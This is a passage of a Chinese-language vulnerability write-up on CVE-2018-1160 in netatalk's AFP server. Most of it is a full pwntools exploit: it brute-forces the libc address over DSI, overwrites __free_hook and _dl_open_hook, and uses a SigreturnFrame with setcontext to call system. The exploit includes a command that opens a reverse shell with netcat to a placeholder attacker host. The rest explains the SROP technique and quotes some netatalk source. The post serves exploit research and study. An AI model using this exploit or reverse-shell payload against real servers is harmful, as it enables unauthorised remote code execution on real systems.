<span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">5566</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_header</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">dsi_opensession</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x01</span><span class="s2">&#34;</span> <span class="c1"># attention quantum option</span>
    <span class="n">dsi_opensession</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1"># length</span>
    <span class="n">dsi_opensession</span> <span class="o">+=</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">addr</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="c1"># &#34;request&#34; flag</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x04</span><span class="s2">&#34;</span> <span class="c1"># open session command</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x01</span><span class="s2">&#34;</span> <span class="c1"># request id</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># data offset</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">dsi_opensession</span><span class="p">))</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># reserved</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">dsi_opensession</span>
    <span class="k">return</span> <span class="n">dsi_header</span>


<span class="n">addr</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">6</span> <span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">create_header</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">4</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
                <span class="n">addr</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">val</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
<span class="n">addr</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">2</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;[+]Now we got an addresss {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">)))</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x535a000</span>  <span class="c1"># 这个offset与环境相关</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">offset</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;[+]libc base {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="srop">SROP</h3>
<p>已知libc基址+任意地址写的情况下，可以覆写<code>_free_hook</code>后续触发<code>free</code>函数来达到攻击目的。<code>free</code>对象并不容易控制，Balsn战队借助SROP达到RCE的目的。</p>
<p>这篇有对<a href="https://www.daimajiaoliu.com/daima/4761d240f900402" target="_blank" rel="noopener noreffer">SROP: Sigreturn Oriented Programming</a>的介绍，总的来说就是利用<code>rt_sigreturn</code>恢复<code>ucontext_t</code>的机制，来构造一个假的<code>ucontext_t</code>，这样就能控制所有的寄存器。<code>pwntools</code>现有的库函数是<code>SigreturnFrame</code>。这个链接中同时介绍了使用SROP进行攻击的一种方法：</p>
<blockquote>
<p>利用fastbin attack劫持<code>__free_hook</code>,利用<code>setcontex</code>来进行SROP然后ROP读出flag;</p>
<p><code>setcontext</code>函数的作用主要是用户上下文的获取和设置,可以利用这个函数直接控制大部分寄存器和执行流.</p>
<p>一般是从<code>setcontext+53</code>开始用的,不然程序容易崩溃,主要是为了避开<code>fldenv [rcx]</code>这个指令，一般用来利用<code>call mprotect-&gt; jmp shellcode</code></p>
</blockquote>
<p>我们在这里同样也是用的这个方法。</p>
<ol>
<li>
<p>将<code>__free_hook</code>改写成<code>__libc_dlopen_mode+56</code></p>
<p>


    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/CVE-2018-1160/2.png">
            <img src="/images/CVE-2018-1160/2.png" alt=""  />
        </a>
    </div>
</p>
</li>
<li>
<p><code>__libc_dlopen_mode+56</code>处会判断<code>_dl_open_hook</code>是否为空，不为空的话<code>call dlopen_mode</code>。</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="k">struct</span> <span class="n">dl_open_hook</span> <span class="n">_dl_open_hook</span> <span class="o">=</span>
  <span class="p">{</span>
    <span class="p">.</span><span class="n">dlopen_mode</span> <span class="o">=</span> <span class="n">__libc_dlopen_mode</span><span class="p">,</span>
    <span class="p">.</span><span class="n">dlsym</span> <span class="o">=</span> <span class="n">__libc_dlsym</span><span class="p">,</span>
    <span class="p">.</span><span class="n">dlclose</span> <span class="o">=</span> <span class="n">__libc_dlclose</span><span class="p">,</span>
    <span class="p">.</span><span class="n">dlvsym</span> <span class="o">=</span> <span class="n">__libc_dlvsym</span><span class="p">,</span>
  <span class="p">};</span>
<span class="cp">#endif
</span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>
<p><code>_dl_open_hook</code>在<code>_free_hook</code>后面，可以覆盖<code>dl_open_hook</code>。覆盖成如下gadget:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">0x7f12ef28aaff &lt;_IO_new_fgetpos+207&gt;:        mov    rdi,rax
0x7f12ef28ab02 &lt;_IO_new_fgetpos+210&gt;:        call   QWORD PTR [rax+0x20]
</code></pre></td></tr></table>
</div>
</div><p>


    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/CVE-2018-1160/3.png">
            <img src="/images/CVE-2018-1160/3.png" alt=""  />
        </a>
    </div>
</p>
<p>此时寄存器中的内容如下:</p>
<p>


    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/CVE-2018-1160/4.png">
            <img src="/images/CVE-2018-1160/4.png" alt=""  />
        </a>
    </div>
</p>
</li>
<li>
<p>以上gadget在<code>call   QWORD PTR [rax+0x20]</code>这条语句中会调用传入的<code>setcontext+53</code>这个地方，即后续SROP触发的地方。</p>
<p>SROP的rdi设置成system函数，参数为前面传入的反弹shell语句。</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;info&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
<span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">5566</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_header</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">dsi_opensession</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x01</span><span class="s2">&#34;</span> <span class="c1"># attention quantum option</span>
    <span class="n">dsi_opensession</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1"># length</span>
    <span class="n">dsi_opensession</span> <span class="o">+=</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">addr</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="c1"># &#34;request&#34; flag</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x04</span><span class="s2">&#34;</span> <span class="c1"># open session command</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x01</span><span class="s2">&#34;</span> <span class="c1"># request id</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># data offset</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">dsi_opensession</span><span class="p">))</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># reserved</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">dsi_opensession</span>
    <span class="k">return</span> <span class="n">dsi_header</span>

<span class="k">def</span> <span class="nf">create_afp</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">afp_command</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span> <span class="c1"># invoke the second entry in the table</span>
    <span class="n">afp_command</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="c1"># protocol defined padding</span>
    <span class="n">afp_command</span> <span class="o">+=</span> <span class="n">payload</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="c1"># &#34;request&#34; flag</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x02</span><span class="s2">&#34;</span> <span class="c1"># &#34;AFP&#34; command</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x02</span><span class="s2">&#34;</span> <span class="c1"># request id</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="c1"># data offset</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">afp_command</span><span class="p">))</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span> <span class="c1"># reserved</span>
    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">afp_command</span>
    <span class="k">return</span> <span class="n">dsi_header</span>


<span class="c1"># get libc base</span>
<span class="n">addr</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">6</span> <span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">create_header</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">4</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
                <span class="n">addr</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">val</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
<span class="n">addr</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">2</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;[+]Now we got an addresss {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">)))</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x535a000</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">offset</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;[+]libc base {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>

<span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;write free hook: &#34;</span><span class="p">)</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
<span class="c1"># mov    rdi,rax ; call   QWORD PTR [rax+0x20]</span>
<span class="n">magic</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x7eaff</span>
<span class="n">dl_openmode</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x166398</span>
<span class="n">dl_open_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3f0588</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">create_header</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)))</span> <span class="c1">#  overwrite afp_command buf with free_hook-0x30</span>
<span class="c1">#</span>
<span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;write shell: &#34;</span><span class="p">)</span>
<span class="n">rip</span><span class="o">=</span><span class="s2">&#34;127.0.0.1&#34;</span>
<span class="n">rport</span><span class="o">=</span><span class="mi">1234</span>
<span class="n">cmd</span><span class="o">=</span><span class="s1">&#39;bash -c &#34;nc evil_ip evil_port -t -e /bin/bash&#34; </span><span class="se">\x00</span><span class="s1">&#39;</span><span class="c1"># cat flag to controled ip and port</span>

<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">free_hook</span> <span class="o">+</span> <span class="mi">8</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">free_hook</span><span class="o">+</span><span class="mh">0x400</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x2e</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">dl_openmode</span><span class="p">)</span> <span class="c1"># free_hook</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x2c98</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">dl_open_hook</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;setcontext&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">53</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)[</span><span class="mh">0x28</span><span class="p">:]</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">create_afp</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">))</span>

<span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;get shell: &#34;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">create_afp</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">))</span>

<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>这个<a href="https://ama2in9.top/2021/01/07/cve-2018-1160/" target="_blank" rel="noopener noreffer">CVE-2018-1160 netatalk越界漏洞复现及分析</a>给的exp中，第一次发送的<code>r.send(create_header(p64(free_hook-0x30)))</code>用来写commands的指针。第二次<code>r.send(create_afp(0,payload))</code>用来在commands处写入布置好的内容。第三次<code>r.send(create_afp(18,&quot;&quot;))</code>用来触发<code>free</code>函数。</p>
<p>在<code>afp_over_dsi</code>函数中存在如下语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c">            <span class="n">function</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_char</span><span class="p">)</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

            <span class="cm">/* AFP replay cache */</span>
            <span class="n">rc_idx</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">clientID</span> <span class="o">%</span> <span class="n">REPLAYCACHE_SIZE</span><span class="p">;</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">&#34;DSI request ID: %u&#34;</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">clientID</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">replaycache</span><span class="p">[</span><span class="n">rc_idx</span><span class="p">].</span><span class="n">DSIreqID</span> <span class="o">==</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">clientID</span>
                <span class="o">&amp;&amp;</span> <span class="n">replaycache</span><span class="p">[</span><span class="n">rc_idx</span><span class="p">].</span><span class="n">AFPcommand</span> <span class="o">==</span> <span class="n">function</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">LOG</span><span class="p">(</span><span class="n">log_note</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">&#34;AFP Replay Cache match: id: %u / cmd: %s&#34;</span><span class="p">,</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">clientID</span><span class="p">,</span> <span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>
                <span class="n">err</span> <span class="o">=</span> <span class="n">replaycache</span><span class="p">[</span><span class="n">rc_idx</span><span class="p">].</span><span class="n">result</span><span class="p">;</span>
            <span class="cm">/* AFP replay cache end */</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="cm">/* send off an afp command. in a couple cases, we take advantage
</span><span class="cm">                 * of the fact that we&#39;re a stream-based protocol. */</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])</span> <span class="p">{</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span> <span class="o">=</span> <span class="n">DSI_DATASIZ</span><span class="p">;</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">|=</span> <span class="n">DSI_RUNNING</span><span class="p">;</span>

                    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">&#34;&lt;== Start AFP command: %s&#34;</span><span class="p">,</span> <span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>

                    <span class="n">AFP_AFPFUNC_START</span><span class="p">(</span><span class="n">function</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>
                    <span class="n">err</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])(</span><span class="n">obj</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span><span class="p">);</span>

</code></pre></td></tr></table>
</div>
</div><p>这里调用了<code>*afp_switch[dsi-&gt;commands[0]]</code>.在默认未登录状态下，<code>afp_switch</code>等于<code>preauth_switch</code>内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
